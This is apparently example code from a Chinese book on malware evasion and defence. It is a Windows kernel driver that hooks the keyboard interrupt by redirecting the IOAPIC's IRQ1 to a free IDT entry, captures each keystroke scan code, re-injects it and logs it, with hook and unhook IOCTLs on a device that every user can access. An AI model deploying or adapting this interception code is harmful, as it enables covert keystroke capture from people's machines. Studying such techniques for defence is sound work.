/*
*  《黑客免杀攻防》例子代码
*
*  作    者：任晓珲（A1Pass）
*  日    期：2013-01-15
*  本书官网：http://book.hackav.com  或 http://www.hzbook.com
*  作者微博：http://weibo.com/a1pass 或 http://t.qq.com/a1pass
*  作者博客：http://a1pass.blog.163.com
*/
#include "IOAPIC_Hook.h"

VOID P2C_WaitForKeyboard(UCHAR cType)
{
	UCHAR cScanCode = 0;
	for (ULONG i=0; i<100; i++)
	{	
		// 读取状态码
		cScanCode = READ_PORT_UCHAR(g_pKeyboardPort64);
		// 等待一段时间
		KeStallExecutionProcessor(100);
		// 检查键盘端口是否已经准备好
		if( !(cScanCode&cType) )  break;
	}
}


VOID PrintScanCode()
{
	// 1. 取出键盘扫描码（此操作会将端口中的扫描码取出并删除）
	P2C_WaitForKeyboard(OBUFFER_FULL);
	UCHAR cScanCode = READ_PORT_UCHAR(g_pKeyboardPort60);

	// 2. 判断此扫描码是否为此函数发送的，是的话直接返回
	if ( g_cLastScanCode==cScanCode )  return;

	// 3. 重新写入键盘扫描码，以方便其他系统模块使用
	g_cLastScanCode = cScanCode;
	WRITE_PORT_UCHAR(g_pKeyboardPort64, 0xD2);
	P2C_WaitForKeyboard(IBUFFER_FULL);
	WRITE_PORT_UCHAR(g_pKeyboardPort60, cScanCode);

	// 4. 打印此扫描码
	KdPrint(("0x%02X\r\n",cScanCode));
}


__declspec(naked) void MyInterruptHook()
{
	// 1. 保存所有寄存器信息
	_asm pushad;
	_asm pushfd;

	// 2. 调用我们的函数
	PrintScanCode();

	// 3. 恢复所有寄存器信息
	_asm popfd;
	_asm popad;

	// 4. 跳转到原ISR函数
	_asm jmp g_uOrigISRPointer;
}


UINT8 GetNullIDT()
{
	// 获取IDT信息
	IDT_INFO stcIdtInfo = {0};
	_asm sidt stcIdtInfo;
	g_pIdtEntry = (PIDT_ENTRY)MAKE_LONG(stcIdtInfo.uLowIdtBase, stcIdtInfo.uHighIdtBase);

	// 判断是否有空闲的IDT可用，有的话则返回其编号
	for ( UINT8 i=0; i<50; i++ )
	{
		if ( g_pIdtEntry[i].GateType == 0 )  return i;
	}
}


NTSTATUS HookIDT()
{
	// 1. 映射IOAPIC的IOREGSEL寄存器
	PHYSICAL_ADDRESS pPhysicalAddr;
	RtlZeroMemory(&pPhysicalAddr,sizeof(PHYSICAL_ADDRESS));
	pPhysicalAddr.u.LowPart = IOREGSEL;
	g_pVisualAddr           = MmMapIoSpace(pPhysicalAddr, 0x14, MmNonCached);
	if ( !MmIsAddressValid(g_pVisualAddr) )  return STATUS_UNSUCCESSFUL;

	// 2. 修改中断处理向量
	UINT32 uIRQ         = 0;
	// 2.1 获得IOAPIC关键寄存器及其他关键信息
	g_pIOREGSEL         = (PIOREGSEL_INFO)g_pVisualAddr;
	g_pIOWIN            = (PUINT32)((UINT32)g_pVisualAddr+0x10);
	g_pIOREGSEL->uAPICR = 0x12;       // 选择第0x12项（即IRQ1）
	uIRQ                = *g_pIOWIN;  // 从窗口寄存器读出内容
	g_uOrigIRQ          = uIRQ;       // 备份IRQ
	if ( uIRQ == 0 )
	{
		MmUnmapIoSpace(g_pVisualAddr, 0x14);
		return STATUS_UNSUCCESSFUL;
	}
	// 2.2 修改IRQ1，使其指向一个空的IDT项
	g_uVector = GetNullIDT();    // 获取一个空的IDT
	uIRQ      = uIRQ&0xFFFFFF00; // 删除后8位
	uIRQ      = uIRQ|g_uVector;  // 重置后8位
	*g_pIOWIN = uIRQ;            // 修改窗口寄存器指向的内容（即IRQ1）

	// 3. 获取键盘中断的ISR
	g_uOrigISRPointer = MAKE_LONG(g_pIdtEntry[NT_INT_KEYBD].uOffsetLow, g_pIdtEntry[NT_INT_KEYBD].uOffsetHigh);

	// 4. 拷贝一个新的中断门，并将ISR设置为我们自己的
	g_pIdtEntry[g_uVector] = g_pIdtEntry[NT_INT_KEYBD];
	__asm cli;
	g_pIdtEntry[g_uVector].uOffsetLow  = (USHORT)MyInterruptHook;
	g_pIdtEntry[g_uVector].uOffsetHigh = (USHORT)((unsigned long)MyInterruptHook >> 16);
	__asm sti;

	return STATUS_SUCCESS;
}


NTSTATUS UnHookIDT()
{ 
	*g_pIOWIN                       = g_uOrigIRQ; // 恢复IRQ1
	g_pIdtEntry[g_uVector].GateType = 0;          // 恢复IDT
	MmUnmapIoSpace(g_pVisualAddr, 0x14);          // 解除映射
	return STATUS_SUCCESS;
}





NTSTATUS DriverEntry(IN PDRIVER_OBJECT  objDriver, IN PUNICODE_STRING strRegPath)
{
	KdPrint(("DDK_DriverExample Compiled %s %s\r\nIn DriverEntry : %wZ\r\n", __DATE__, __TIME__, strRegPath));

	// 1. 声明并初始化关键局部变量
	NTSTATUS       nStatus       = STATUS_SUCCESS;
	// 设备对象
	PDEVICE_OBJECT objDev        = nullptr;
	// 设备名称
	UNICODE_STRING strDeviceName = RTL_CONSTANT_STRING(DEVICE_NAME);
	// 符号链接名称
	UNICODE_STRING strSymbolicName;
	// 所有用户可读可写权限的SDDL
	UNICODE_STRING strSDDL       = RTL_CONSTANT_STRING(L"D:P(A;;GA;;;WD)");
	// 自己随便写一个GUID，或使用Visual Studio自带的GUID生成器生成一个
	const GUID     MY_GUID       = {0x12345678L,0x1234,0x1234,{0x12,0x34,0x56,0x78,0x90,0xAB,0xCB,0xEF}};

	// 2. 创建带安全描述符的设备对象
	nStatus = IoCreateDeviceSecure( 
		objDriver,                  // 驱动对象
		0,                          // 设备扩展对象的结构体大小
		&strDeviceName,             // 设备名称
		FILE_DEVICE_UNKNOWN,        // 设备类型
		FILE_DEVICE_SECURE_OPEN,    // 设备特征信息
		FALSE,                      // 设备是否为独占的
		&strSDDL,                   // 安全描述符定义语言
		&MY_GUID,                   // GUID
		&objDev);                   // 输出创建完成的设备对象指针
	if(!NT_SUCCESS(nStatus))
	{
		KdPrint(("Error, IoCreateDevice = 0x%x\r\n", nStatus));
		return nStatus;
	}

	// 3. 创建链接符号
	if(IoIsWdmVersionAvailable(1,0x10))
		RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_GLOBAL_NAME);
	else
		RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_NAME);

	nStatus = IoCreateSymbolicLink(&strSymbolicName, &strDeviceName);
	if(!NT_SUCCESS(nStatus))
	{
		KdPrint(("Error, IoCreateSymbolicLink = 0x%x\r\n", nStatus));
		IoDeleteDevice(objDev);
		return nStatus;
	}

	// 4. 设置派遣函数
	objDriver->MajorFunction[IRP_MJ_CREATE]         = (PDRIVER_DISPATCH)DispatchCreateClose;
	objDriver->MajorFunction[IRP_MJ_CLOSE]          = (PDRIVER_DISPATCH)DispatchCreateClose;
	objDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)DispatchDeviceControl;

	// 5. 设置卸载函数
	objDriver->DriverUnload = DriverUnload;


	return STATUS_SUCCESS;
}


NTSTATUS DispatchCreateClose(IN PDEVICE_OBJECT objDeivce, IN PIRP pIrp)
{
	UNREFERENCED_PARAMETER(objDeivce);

	// 设置IRP完成状态
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	// 设置IRP操作了多少字节
	pIrp->IoStatus.Information = 0;
	// 处理IRP
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}


NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT objDeivce, IN PIRP pIrp)
{
	// 1. 声明并初始化关键局部变量
	UNREFERENCED_PARAMETER(objDeivce);
	NTSTATUS nStatus             = STATUS_INVALID_DEVICE_REQUEST;
	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	ULONG uIoControlCode         = 0;
	PVOID pIoBuffer				 = NULL;
	ULONG uInSize                = 0;
	ULONG uOutSize               = 0;
	// 获取IoCtrl码
	uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
	// 获取传入I/O缓存
	pIoBuffer      = pIrp->AssociatedIrp.SystemBuffer;
	// 获取传入I/O缓存的大小
	uInSize        = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
	// 获取传出I/O缓存的大小
	uOutSize       = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;

	// 2. 相应用户信息
	switch(uIoControlCode)
	{
	case IOCTL_HELLO_WORLD:  // 打印字符串
		KdPrint(("Hello World!\r\n"));
		nStatus = STATUS_SUCCESS;
		break;
	case IOCTL_HOOK_IDT:    // HOOK_IDT
		HookIDT();
		nStatus = STATUS_SUCCESS;
		break;
	case IOCTL_UNHOOK_IDT:  // UNHOOK_IDT
		UnHookIDT();
		nStatus = STATUS_SUCCESS;
		break;
	default:
		KdPrint(("Unknown IOCTL: 0x%X (%04X,%04X)\r\n", 
			uIoControlCode,
			DEVICE_TYPE_FROM_CTL_CODE(uIoControlCode),
			IoGetFunctionCodeFromCtlCode(uIoControlCode) ));
		nStatus = STATUS_INVALID_PARAMETER;	
		break;
	}

	// 3. 完成I/O请求
	if(nStatus == STATUS_SUCCESS)
		pIrp->IoStatus.Information = uOutSize;
	else
		pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = nStatus;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return nStatus;
}


VOID DriverUnload(IN PDRIVER_OBJECT objDriver)
{
	// 1. 删除链接符号
	UNICODE_STRING strSymbolicName;
	if(IoIsWdmVersionAvailable(1,0x10))
		RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_GLOBAL_NAME);
	else
		RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_NAME);
	IoDeleteSymbolicLink(&strSymbolicName);

	// 2. 删除设备对象
	if ( objDriver->DeviceObject )
	    IoDeleteDevice(objDriver->DeviceObject);
}